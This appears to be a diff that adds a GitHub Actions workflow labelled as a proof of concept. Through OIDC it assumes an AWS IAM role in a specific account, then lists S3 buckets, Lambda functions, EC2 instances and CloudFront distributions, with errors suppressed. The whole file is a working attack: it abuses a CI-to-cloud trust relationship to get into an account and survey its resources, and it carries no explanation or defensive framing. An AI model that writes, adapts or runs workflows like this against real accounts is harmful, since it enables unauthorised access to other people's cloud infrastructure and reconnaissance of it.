@@ -1,0 +1,40 @@
+name: cloudescape-oidc-poc
+
+on:
+  push:
+    branches:
+      - corgi
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  assume-role:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS credentials via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          aws-region: us-east-1
+
+      - name: Confirm identity
+        run: aws sts get-caller-identity
+
+      - name: Enumerate S3 buckets
+        run: aws s3 ls
+        continue-on-error: true
+
+      - name: Enumerate Lambda functions
+        run: aws lambda list-functions
+        continue-on-error: true
+
+      - name: Enumerate EC2 instances
+        run: aws ec2 describe-instances --region us-east-1
+        continue-on-error: true
+
+      - name: Enumerate CloudFront distributions
+        run: aws cloudfront list-distributions
+        continue-on-error: true
